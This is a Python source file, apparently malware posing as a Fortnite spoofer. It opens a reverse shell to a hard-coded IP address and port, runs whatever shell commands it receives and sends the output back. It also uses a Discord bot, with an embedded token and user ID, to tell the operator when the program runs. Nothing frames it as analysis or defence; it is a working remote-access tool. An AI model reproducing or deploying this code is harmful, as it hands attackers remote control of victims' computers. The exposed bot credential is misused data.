import socket
import subprocess
import threading
import discord
from discord.ext import commands
import os 
from datetime import datetime
import psutil
import getpass

attacker_ip = '2.34.218.84'
attacker_port = 11111

def get_current_time():
    return datetime.now().strftime("[%H:%M:%S]")

intents = discord.Intents.default()
intents.message_content = True
BOT_TOKEN = "MTI5MjAyMTE1NzgwMDcwNjA4OA.GP3Cj7.ZeUzREYgC7djg19GXqdmNY8sWJS_cDwbn_CaYw"
USER_ID = 1094771977497088041
bot = commands.Bot(command_prefix='/', intents=intents)

@bot.event
async def on_ready():
    print('Bot connesso...')
    user = await bot.fetch_user(USER_ID)
    await user.send("Bot connesso")

filename = 'fortnitespoofer.exe'

location = f"C:/Users/{getpass.getuser()}/Downloads/{filename}"

async def check_anydesk_running():
    sp_running = False
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == 'fortnitespoofer.exe':
            anydesk_running = True
            break
    if anydesk_running:
        user = await bot.fetch_user(USER_ID)
        await user.send(f'eseguito in')


def receive_commands(s):
    while True:
        try:
            command = s.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                s.close()
                break
            if command:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output, error = process.communicate()
                if output:
                    s.send(output)
                if error:
                    s.send(error)
        except Exception:
            s.close()
            break

def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((attacker_ip, attacker_port))
            threading.Thread(target=receive_commands, args=(s,), daemon=True).start()
            while True:
                pass
        except Exception:
            continue

if __name__ == "__main__":
    reverse_shell()